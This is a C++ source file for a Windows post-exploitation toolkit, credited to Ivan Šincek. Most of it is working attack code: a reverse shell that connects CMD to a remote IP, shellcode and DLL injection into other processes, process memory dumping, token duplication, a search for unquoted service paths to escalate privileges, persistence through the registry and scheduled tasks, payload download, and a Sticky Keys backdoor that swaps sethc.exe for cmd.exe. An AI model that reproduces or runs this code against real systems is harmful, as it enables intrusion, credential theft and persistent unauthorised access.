// Copyright (c) 2019 Ivan Šincek

#include <winsock2.h>
#pragma  comment(lib, "ws2_32.lib")
#include ".\invoker.h"
#include <iostream>
#include <fstream>
#pragma  comment(lib, "urlmon.lib")
#pragma  comment(lib, "libole32.lib")
#include <initguid.h>
#include <mstask.h>
#pragma  comment(lib, "libuuid.lib")
#include <tlhelp32.h>
#include <dbghelp.h>

#define BUFFER_SIZE 1024

// -----------------------------------------------------

std::string intToStr(int num) {
	char str[10] = "";
	itoa(num, str, 10);
	return std::string(str);
}

std::string strToLower(std::string str) {
	int length = str.length();
	for (int i = 0; i < length; i++) {
		str[i] = tolower(str[i]);
	}
	return str;
}

std::string strToUpper(std::string str) {
	int length = str.length();
	for (int i = 0; i < length; i++) {
		str[i] = toupper(str[i]);
	}
	return str;
}

std::string trim(std::string str) {
	const char array[] = "\x20\f\n\r\t\v";
	str.erase(0, str.find_first_not_of(array));
	str.erase(str.find_last_not_of(array) + 1);
	return str;
}

void output(std::string msg) {
	printf(msg.append("\n").c_str());
}

std::string input(std::string msg) {
	printf(msg.append(": ").c_str());
	std::string var = "";
	getline(std::cin, var);
	return trim(var);
}

bool isPositiveNumber(std::string str) {
	return str.find_first_not_of("0123456789") == std::string::npos;
}

// -----------------------------------------------------

bool isCmdAccessible() {
	bool success = false;
	if (system("echo \"Invoker\" 1>nul") == 0) {
		success = true;
	}
	else {
		output("Cannot access the command processor");
	}
	return success;
}

void cmdExec(std::string command) {
	if (isCmdAccessible()) {
		command = command.length() > 0 ? "CMD /K \"" + command + "\"" : "CMD";
		system(command.c_str());
	}
}

void psExec(std::string command) {
	if (isCmdAccessible()) {
		command = command.length() > 0 ? "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand " + command : "PowerShell -ExecutionPolicy Unrestricted -NoProfile";
		system(command.c_str());
	}
}

// -----------------------------------------------------

bool createFile(std::string out, std::string data) {
	bool success = false;
	std::ofstream stream(out.c_str(), (std::ios::out | std::ios::trunc | std::ios::binary));
	if (stream.fail()) {
		output("Cannot create \"" + out + "\"");
	}
	else {
		stream.write(data.c_str(), data.length());
		success = true;
		output("\"" + out + "\" was created successfully");
		stream.close();
	}
	return success;
}

std::string readFile(std::string file) {
	std::string data = "";
	std::ifstream stream(file.c_str(), (std::ios::in | std::ios::binary));
	if (stream.fail()) {
		output("Cannot read \"" + file + "\"");
	}
	else {
		char* buffer = new char[BUFFER_SIZE];
		while (!stream.eof()) {
			stream.read(buffer, BUFFER_SIZE);
			data.append(buffer, stream.gcount());
		}
		delete[] buffer;
		if (data.length() < 1) {
			output("\"" + file + "\" is empty");
		}
		stream.close();
	}
	return data;
}

bool appendFile(std::string file, std::string data) {
	bool success = false;
	std::ofstream stream(file.c_str(), (std::ios::app | std::ios::binary));
	if (stream.fail()) {
		output("Cannot open \"" + file + "\"");
	}
	else {
		stream.write(data.c_str(), data.length());
		success = true;
		stream.close();
	}
	return success;
}

// NOTE: This method will only copy non-empty files.
bool copyFile(std::string original, std::string out) {
	bool success = false;
	std::string data = readFile(original);
	if (data.length() > 0 && createFile(out, data) != 0) {
		success = true;
	}
	return success;
}

bool downloadFile(std::string url, std::string out) {
	bool success = false;
	if (URLDownloadToFile(NULL, url.c_str(), out.c_str(), 0, NULL) != S_OK) {
		output("Cannot download \"" + url + "\"");
	}
	else {
		success = true;
		output("Download was saved in \"" + out + "\"");
	}
	return success;
}

// -----------------------------------------------------

bool editRegKey(PHKEY hKey, std::string subkey, std::string name, std::string data) {
	bool success = false;
	HKEY nKey = NULL;
	if (RegCreateKeyExA(*hKey, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &nKey, NULL) != ERROR_SUCCESS) {
		output("Cannot create/open the registry key");
	}
	else if (RegSetValueExA(nKey, name.c_str(), 0, REG_SZ, (LPBYTE)data.c_str(), data.length()) != ERROR_SUCCESS) {
		output("Cannot add/eddit the registry key");
	}
	else {
		success = true;
		output("Registry key was added/edited successfully");
	}
	if (nKey != NULL && RegCloseKey(nKey) != ERROR_SUCCESS) {
		output("");
		output("Cannot close the registry key");
	}
	return success;
}

bool scheduleTask(std::string name, std::string user, std::string file, std::string args) {
	bool success = false;
	DWORD status = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (status != S_OK && status != S_FALSE) {
		output("Cannot initialize the use of COM library");
	}
	else {
		ITaskScheduler* tskschd = NULL;
		if (CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&tskschd) != S_OK) {
			output("Cannot create the COM class object of Task Scheduler");
		}
		else {
			ITask* task = NULL;
			if (tskschd->NewWorkItem((LPCWSTR)std::wstring(name.begin(), name.end()).c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&task) != S_OK) {
				output("Cannot create the task");
			}
			else {
				task->SetAccountInformation(std::wstring(user.begin(), user.end()).c_str(), NULL);
				task->SetApplicationName(std::wstring(file.begin(), file.end()).c_str());
				task->SetParameters(std::wstring(args.begin(), args.end()).c_str());
				task->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
				WORD index = 0;
				ITaskTrigger* trigger = NULL;
				if (task->CreateTrigger(&index, &trigger) != S_OK) {
					output("Cannot create the trigger");
				}
				else {
					SYSTEMTIME now = { 0 };
					GetLocalTime(&now);
					TASK_TRIGGER info = { 0 };
					info.cbTriggerSize = sizeof(info);
					// NOTE: Task will trigger only once.
					info.TriggerType = TASK_TIME_TRIGGER_ONCE;
					// NOTE: Task will trigger after exactly one minute.
					info.wStartMinute = now.wMinute + 1;
					info.wStartHour = now.wHour;
					info.wBeginDay = now.wDay;
					info.wBeginMonth = now.wMonth;
					info.wBeginYear = now.wYear;
					if (trigger->SetTrigger(&info) != S_OK) {
						output("Cannot set the trigger");
					}
					else {
						IPersistFile* pFile = NULL;
						if (task->QueryInterface(IID_IPersistFile, (LPVOID*)&pFile) != S_OK) {
							output("Cannot get the persistance interface");
						}
						else {
							if (pFile->Save(NULL, TRUE) != S_OK) {
								output("Cannot save the task object to a file");
							}
							else {
								success = true;
								output("Task was scheduled successfully");
							}
							pFile->Release();
						}
					}
					trigger->Release();
				}
				task->Release();
			}
			tskschd->Release();
		}
		CoUninitialize();
	}
	return success;
}

bool reverseTcp(std::string ip, int port) {
	bool success = false;
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		output("Cannot initiate the use of Winsock DLL");
	}
	else {
		SOCKET hSocket = WSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
		if (hSocket == INVALID_SOCKET) {
			output("Cannot create the connection socket");
		}
		else {
			struct sockaddr_in server = { 0 };
			server.sin_family = AF_INET;
			server.sin_addr.s_addr = inet_addr(ip.c_str());
			server.sin_port = htons(port);
			if (WSAConnect(hSocket, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL) != 0) {
				output("Cannot connect to the server");
			}
			else {
				STARTUPINFOA sInfo = { 0 };
				sInfo.cb = sizeof(sInfo);
				sInfo.dwFlags = STARTF_USESTDHANDLES;
				sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)hSocket;
				PROCESS_INFORMATION pInfo = { 0 };
				if (CreateProcessA(NULL, (LPSTR)"CMD", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo) == 0) {
					output("Cannot run the process");
				}
				else {
					success = true;
					output("Backdoor is up and running...");
					WaitForSingleObject(pInfo.hProcess, INFINITE);
					CloseHandle(pInfo.hProcess);
					CloseHandle(pInfo.hThread);
				}
			}
			closesocket(hSocket);
		}
		WSACleanup();
	}
	return success;
}

// -----------------------------------------------------

// NOTE: Returns true if it is a 32-bit process.
WINBOOL isWow64(int pid) {
	WINBOOL success = false;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
	}
	if (hProcess != NULL) {
		IsWow64Process(hProcess, &success);
		CloseHandle(hProcess);
	}
	return success;
}

// NOTE: Returns -1 on failure or if not exists.
int getProcessId() {
	bool exists = false;
	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		output("Cannot create the snapshot of current processes");
	}
	else {
		output("############################# PROCESS LIST #############################");
		printf("# %-6s | %-*.*s | %-4s #\n", "PID", 52, 52, "NAME", "ARCH");
		output("#----------------------------------------------------------------------#");
		while (Process32Next(hSnapshot, &entry)) {
			printf("# %-6d | %-*.*s | %-4s #\n", entry.th32ProcessID, 52, 52, entry.szExeFile, isWow64(entry.th32ProcessID) ? "32" : "64");
		}
		output("########################################################################");
		std::string id = input("Enter proccess ID");
		output("");
		if (id.length() < 1) {
			output("Process ID is rquired");
		}
		else if (!isPositiveNumber(id)) {
			output("Process ID must be a positive number");
		}
		else {
			int pid = atoi(id.c_str());
			Process32First(hSnapshot, &entry);
			do {
				if (entry.th32ProcessID == pid) {
					exists = true;
					break;
				}
			} while (Process32Next(hSnapshot, &entry));
			if (!exists) {
				output("Process does not exists");
			}
		}
		CloseHandle(hSnapshot);
	}
	return exists ? entry.th32ProcessID : -1;
}

bool terminateProcess(int pid) {
	bool success = false;
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pid);
	if (hProcess == NULL) {
		output("Cannot get the process handle");
	}
	else {
		if (TerminateProcess(hProcess, 0) == 0) {
			output("Cannot terminate the process");
		}
		else {
			success = true;
			output("Process was terminated successfully");
		}
		CloseHandle(hProcess);
	}
	return success;
}

bool runProcess(std::string file, std::string args, PHANDLE hToken) {
	bool success = false;
	PROCESS_INFORMATION pInfo = { 0 };
	if (hToken == NULL) {
		STARTUPINFOA sInfo = { 0 };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessA(file.c_str(), (LPSTR)args.c_str(), NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	else {
		STARTUPINFOW sInfo = { 0 };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessWithTokenW(*hToken, LOGON_WITH_PROFILE, (LPCWSTR)std::wstring(file.begin(), file.end()).c_str(), (LPWSTR)args.c_str(), CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	if (success) {
		output("Process was run successfully");
		CloseHandle(pInfo.hProcess);
		CloseHandle(pInfo.hThread);
	}
	else {
		output("Cannot run the process");
	}
	return success;
}

bool dumpProcMemory(int pid) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess((PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ), 0, pid);
	}
	if (hProcess == NULL) {
		output("Cannot get the process handle");
	}
	else {
		std::string out = std::string("proc_mem_").append(intToStr(pid)).append(".dmp");
		HANDLE hFile = CreateFile(out.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			output("Cannot create \"" + out + "\"");
		}
		else {
			if (MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL) != 0) {
				success = true;
				output("Process memory was dumped in \"" + out + "\"");
			}
			else {
				output("Cannot dump the process memory");
			}
			CloseHandle(hFile);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// -----------------------------------------------------

// NOTE: This method does not yet support HTTPS.
std::string getWebContent(std::string url, int port, std::string method) {
	std::string data = "";
	std::size_t pos = url.find("://");
	if (pos != std::string::npos) {
		url.erase(0, pos + 3);
	}
	std::string host = url;
	std::string path = "/";
	pos = url.find("/");
	if (pos != std::string::npos) {
		host = url.substr(0, pos);
		path = url.substr(pos);
	}
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		output("Cannot initiate the use of Winsock DLL");
	}
	else {
		SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0);
		if (hSocket == INVALID_SOCKET) {
			output("Cannot create the connection socket");
		}
		else {
			struct hostent* h = gethostbyname(host.c_str());
			if (h == NULL) {
				output("Cannot resolve the server IP address");
			}
			else {
				struct sockaddr_in server = { 0 };
				server.sin_family = AF_INET;
				server.sin_addr = *((struct in_addr*)h->h_addr);
				server.sin_port = htons(port);
				if (WSAConnect(hSocket, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL) != 0) {
					output("Cannot connect to the server");
				}
				else {
					// NOTE: You can edit an HTTP request header here.
					// NOTE: By default an HTTP GET request will be sent.
					std::string request = strToUpper(method) + " " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n";
					send(hSocket, request.c_str(), request.length(), 0);
					char* buffer = new char[BUFFER_SIZE];
					int bytes = 0;
					do {
						bytes = recv(hSocket, buffer, BUFFER_SIZE, 0);
						data.append(buffer, bytes);
					} while (bytes != 0);
					delete[] buffer;
					if (data.length() < 1) {
						output("No data was received");
					}
				}
			}
			closesocket(hSocket);
		}
		WSACleanup();
	}
	return data;
}

std::string extractPayload(std::string data, std::string element, std::string placeholder) {
	std::string payload = "";
	std::size_t pos = element.find(placeholder);
	if (pos == std::string::npos) {
		output("Payload placeholder was not found");
	}
	else {
		std::string front = element.substr(0, pos);
		std::string back = element.substr(pos + placeholder.length());
		if (front.length() < 1 || back.length() < 1) {
			output("Payload must be enclosed from both front and back");
		}
		else {
			std::size_t posFront = data.find(front);
			if (posFront != std::string::npos) {
				data.erase(0, posFront + front.length());
			}
			std::size_t posBack = data.find(back);
			if (posBack != std::string::npos) {
				data.erase(posBack);
			}
			if (posFront == std::string::npos || posBack == std::string::npos) {
				output("Custom element was not found");
			}
			else if (data.length() < 1) {
				output("Payload is empty");
			}
			else {
				payload = data;
				output("Payload was extracted successfully");
			}
		}
	}
	return payload;
}

bool injectBytecode(int pid, std::string bytecode) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
	if (hProcess == NULL) {
		output("Cannot get the process handle");
	}
	else {
		PVOID addr = VirtualAllocEx(hProcess, NULL, bytecode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			output("Cannot allocate the additional process memory");
		}
		else {
			if (WriteProcessMemory(hProcess, addr, bytecode.c_str(), bytecode.length(), NULL) == 0) {
				output("Cannot write to the process memory");
			}
			else {
				HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
				if (hThread == NULL) {
					output("Cannot start the process thread");
				}
				else {
					success = true;
					output("Bytecode was injected successfully");
					CloseHandle(hThread);
				}
			}
			VirtualFreeEx(hProcess, addr, bytecode.length(), MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// -----------------------------------------------------

bool injectDll(int pid, std::string file) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
	if (hProcess == NULL) {
		output("Cannot get the process handle");
	}
	else {
		PVOID addr = VirtualAllocEx(hProcess, NULL, file.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			output("Cannot allocate the additional process memory");
		}
		else {
			if (WriteProcessMemory(hProcess, addr, file.c_str(), file.length(), NULL) == 0) {
				output("Cannot write to the process memory");
			}
			else {
				HMODULE hLib = LoadLibraryA("kernel32.dll");
				if (hLib == NULL) {
					output("Cannot load the Kernel32 DLL");
				}
				else {
					LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hLib, "LoadLibraryA");
					if (lpRoutine == NULL) {
						output("Cannot get the address of LoadLibraryA()");
					}
					else {
						HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpRoutine, addr, 0, NULL);
						if (hThread == NULL) {
							output("Cannot start the process thread");
						}
						else {
							success = true;
							output("DLL was injected successfully");
							CloseHandle(hThread);
						}
					}
					FreeLibrary(hLib);
				}
			}
			VirtualFreeEx(hProcess, addr, file.length(), MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// NOTE: This method will not list missing DLLs, only loaded ones.
// TO DO: List missing DLLs.
void listProcessDlls(int pid) {
	MODULEENTRY32 entry = { 0 };
	entry.dwSize = sizeof(MODULEENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		output("Cannot create the snapshot of process modules");
	}
	else {
		while (Module32Next(hSnapshot, &entry)) {
			output(entry.szExePath);
		}
		CloseHandle(hSnapshot);
	}
}

// NOTE: For this method to work your DLL must export HookProc() and GetHookType().
void hookJob(struct hook* info) {
	info->active = true;
	HMODULE hLib = LoadLibraryA(info->file.c_str());
	if (hLib == NULL) {
		output("Cannot load the \"" + info->file + "\"");
	}
	else {
		HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hLib, "HookProc");
		if (hookProc == NULL) {
			output("Cannot get the address of HookProc()");
		}
		else {
			FARPROC getHookType = (FARPROC)GetProcAddress(hLib, "GetHookType");
			if (getHookType == NULL) {
				output("Cannot get the address of GetHookType()");
			}
			else {
				HHOOK hHook = SetWindowsHookExA(getHookType(), hookProc, hLib, 0);
				if (hHook == NULL) {
					output("Cannot install the hook procedure");
				}
				else {
					output("Hook procedure was installed successfully");
					MSG msg = { 0 };
					while (info->active && PeekMessageA(&msg, NULL, 0, 0, PM_NOREMOVE) != WM_QUIT) {
						TranslateMessage(&msg);
						DispatchMessageA(&msg);
					}
					UnhookWindowsHookEx(hHook);
					CloseHandle(hHook);
					output("");
					output("Hook procedure was uninstalled successfully");
				}
			}
		}
		FreeLibrary(hLib);
	}
	info->active = false;
}

HANDLE createHookThread(struct hook* info) {
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hookJob, info, 0, NULL);
	if (hThread == NULL) {
		output("Cannot create the hook thread");
	}
	else {
		// NOTE: Just a little delay so the output doesn't get messed up.
		WaitForSingleObject(hThread, 500);
	}
	return hThread;
}

// -----------------------------------------------------

void enableAccessTokenPrivs() {
	HANDLE hProcess = GetCurrentProcess();
	if (hProcess == NULL) {
		output("Cannot get the process handle");
	}
	else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), &hToken) == 0) {
			output("Cannot get the token handle");
		}
		else {
			struct privs {
				const std::string privilege;
				bool set;
			};
			privs array[] = {
				{ "SeAssignPrimaryTokenPrivilege",             false },
				{ "SeAuditPrivilege",                          false },
				{ "SeBackupPrivilege",                         false },
				{ "SeChangeNotifyPrivilege",                   false },
				{ "SeCreateGlobalPrivilege",                   false },
				{ "SeCreatePagefilePrivilege",                 false },
				{ "SeCreatePermanentPrivilege",                false },
				{ "SeCreateSymbolicLinkPrivilege",             false },
				{ "SeCreateTokenPrivilege",                    false },
				{ "SeDebugPrivilege",                          false },
				{ "SeDelegateSessionUserImpersonatePrivilege", false },
				{ "SeEnableDelegationPrivilege",               false },
				{ "SeImpersonatePrivilege",                    false },
				{ "SeIncreaseBasePriorityPrivilege",           false },
				{ "SeIncreaseQuotaPrivilege",                  false },
				{ "SeIncreaseWorkingSetPrivilege",             false },
				{ "SeLoadDriverPrivilege",                     false },
				{ "SeLockMemoryPrivilege",                     false },
				{ "SeMachineAccountPrivilege",                 false },
				{ "SeManageVolumePrivilege",                   false },
				{ "SeProfileSingleProcessPrivilege",           false },
				{ "SeRelabelPrivilege",                        false },
				{ "SeRemoteShutdownPrivilege",                 false },
				{ "SeRestorePrivilege",                        false },
				{ "SeSecurityPrivilege",                       false },
				{ "SeShutdownPrivilege",                       false },
				{ "SeSyncAgentPrivilege",                      false },
				{ "SeSystemEnvironmentPrivilege",              false },
				{ "SeSystemProfilePrivilege",                  false },
				{ "SeSystemtimePrivilege",                     false },
				{ "SeTakeOwnershipPrivilege",                  false },
				{ "SeTcbPrivilege",                            false },
				{ "SeTimeZonePrivilege",                       false },
				{ "SeTrustedCredManAccessPrivilege",           false },
				{ "SeUndockPrivilege",                         false },
				{ "SeUnsolicitedInputPrivilege",               false }
			};
			int size = sizeof(array) / sizeof(array[0]);
			for (int i = 0; i < size - 1; i++) {
				TOKEN_PRIVILEGES tp = { 0 };
				if (LookupPrivilegeValueA(NULL, array[i].privilege.c_str(), &tp.Privileges[0].Luid) != 0) {
					tp.PrivilegeCount = 1;
					tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
					if (AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), NULL, NULL) != 0 && GetLastError() == ERROR_SUCCESS) {
						array[i].set = true;
					}
				}
			}
			output("########################## PRIVILEGES ENABLED ##########################");
			for (int i = 0; i < size - 1; i++) {
				if (array[i].set) {
					printf("# %-*.*s #\n", 68, 68, array[i].privilege.c_str());
				}
			}
			output("########################################################################");
			output("");
			output("######################## PRIVILEGES NOT ENABLED ########################");
			for (int i = 0; i < size - 1; i++) {
				if (!array[i].set) {
					printf("# %-*.*s #\n", 68, 68, array[i].privilege.c_str());
				}
			}
			output("########################################################################");
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
}

HANDLE duplicateAccessToken(int pid) {
	HANDLE dToken = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
	}
	if (hProcess == NULL) {
		output("Cannot get the process handle");
	}
	else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY), &hToken) == 0) {
			output("Cannot get the token handle");
		}
		else {
			if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken) == 0) {
				output("Cannot duplicate the token");
			}
			else {
				output("Token was duplicated successfully");
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
	return dToken;
}

// -----------------------------------------------------

// NOTE: This method must allocate a lot of additional process memory.
// NOTE: This method will only search for unquoted service paths outside of \Windows\ directory.
// NOTE: Services must be able to start either automatically or manually and either be running or stopped.
std::string getUnquotedServiceName() {
	std::string name = "";
	SC_HANDLE hManager = OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
	if (hManager == NULL) {
		output("Cannot get the service control manager handle");
	}
	else {
		DWORD size = 0, count = 0, resume = 0;
		if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &size, &count, &resume) != 0) {
			output("Cannot get the size of additional process memory");
		}
		else {
			LPENUM_SERVICE_STATUSA buffer = (LPENUM_SERVICE_STATUSA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
			if (buffer == NULL) {
				output("Cannot allocate the additional process memory");
			}
			else {
				if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, (LPENUM_SERVICE_STATUSA)buffer, size, &size, &count, &resume) == 0) {
					output("Cannot enumerate the services");
				}
				else {
					LPENUM_SERVICE_STATUSA services = buffer;
					bool exists = false;
					for (int i = 0; i < count; i++) {
						SC_HANDLE hService = OpenServiceA(hManager, services->lpServiceName, SERVICE_QUERY_CONFIG);
						if (hService != NULL) {
							if (QueryServiceConfigA(hService, NULL, 0, &size) == 0) {
								LPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
								if (config != NULL) {
									if (QueryServiceConfigA(hService, config, size, &size) != 0) {
										std::string path(config->lpBinaryPathName, strlen(config->lpBinaryPathName));
										if (path.find("\"") == std::string::npos && strToLower(path).find(":\\windows\\") == std::string::npos && (config->dwStartType == SERVICE_AUTO_START || config->dwStartType == SERVICE_DEMAND_START) && (services->ServiceStatus.dwCurrentState == SERVICE_RUNNING || services->ServiceStatus.dwCurrentState == SERVICE_STOPPED)) {
											exists = true;
											printf("Name        : %s\n", services->lpServiceName);
											printf("DisplayName : %s\n", services->lpDisplayName);
											printf("PathName    : %s\n", config->lpBinaryPathName);
											printf("StartName   : %s\n", config->lpServiceStartName);
											printf("StartMode   : %s\n", config->dwStartType == SERVICE_AUTO_START ? "Auto" : "Manual");
											printf("State       : %s\n", services->ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped");
											printf("\n");
										}
									}
									HeapFree(GetProcessHeap(), 0, config);
								}
							}
							CloseServiceHandle(hService);
						}
						services++;
					}
					if (exists) {
						std::string str = input("Enter service name");
						output("");
						if (str.length() < 1) {
							output("Service name is rquired");
						}
						else {
							services = buffer;
							exists = false;
							for (int i = 0; i < count; i++) {
								if (services->lpServiceName == str) {
									exists = true;
									name = services->lpServiceName;
									break;
								}
								services++;
							}
							if (!exists) {
								output("Service does not exists");
							}
						}
					}
					else {
						output("No unquoted service paths were found");
					}
				}
				HeapFree(GetProcessHeap(), 0, buffer);
			}
		}
		CloseServiceHandle(hManager);
	}
	return name;
}

// NOTE: Mode 1 - Start
//       Mode 2 - Stop
//       Mode 3 - Restart
bool manageService(std::string name, int mode) {
	bool success = false;
	SC_HANDLE hManager = OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
	if (hManager == NULL) {
		output("Cannot get the service control manager handle");
	}
	else {
		SC_HANDLE hService = OpenServiceA(hManager, name.c_str(), (SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP));
		if (hService == NULL) {
			output("Cannot get the service handle");
		}
		else {
			SERVICE_STATUS info = { 0 };
			if (QueryServiceStatus(hService, &info) == 0) {
				output("Cannot get the service information");
			}
			else {
				if (mode == 2 || mode == 3) {
					if (info.dwCurrentState == SERVICE_STOPPED) {
						success = true;
						output("Service is not running");
					}
					else if (ControlService(hService, SERVICE_CONTROL_STOP, &info) == 0) {
						success = false;
						output("Cannot stop the service");
					}
					else {
						do {
							Sleep(200);
							if (QueryServiceStatus(hService, &info) == 0) {
								success = false;
								output("Cannot update the service info");
								break;
							}
						} while (info.dwCurrentState == SERVICE_STOP_PENDING);
						if (info.dwCurrentState == SERVICE_STOPPED) {
							success = true;
							output("Service was stopped successfully");
						}
					}
				}
				if (mode == 3) {
					output("");
				}
				if (mode == 1 || mode == 3) {
					if (info.dwCurrentState == SERVICE_RUNNING) {
						success = true;
						output("Service is already running");
					}
					else if (StartServiceA(hService, 0, NULL) == 0) {
						success = false;
						output("Cannot start the service");
					}
					else {
						do {
							Sleep(200);
							if (QueryServiceStatus(hService, &info) == 0) {
								success = false;
								output("Cannot update the service info");
								break;
							}
						} while (info.dwCurrentState == SERVICE_START_PENDING);
						if (info.dwCurrentState == SERVICE_RUNNING) {
							success = true;
							output("Service was started successfully");
						}
					}
				}
			}
			CloseServiceHandle(hService);
		}
		CloseServiceHandle(hManager);
	}
	return success;
}

// -----------------------------------------------------

// NOTE: To restore the backup, rename "sethc_backup.exe" back to "sethc.exe".
// TO DO: Add more programs to replace, e.g. add Magnify.exe, Narrator.exe, etc.
bool replaceStickyKeys() {
	bool success = false;
	char* windir = getenv("WINDIR");
	if (windir == NULL) {
		output("Cannot resolve %WINDIR% path");
	}
	else {
		std::string dir = std::string(windir, strlen(windir)).append("\\System32\\");
		if (copyFile(dir + "sethc.exe", dir + "sethc_backup.exe") != 0) {
			output("");
			output("Replacing Sticky Keys with CMD...");
			output("");
			if (copyFile(dir + "cmd.exe", dir + "sethc.exe") != 0) {
				success = true;
				output("");
				output("Press the shift key five times...");
			}
		}
	}
	return success;
}

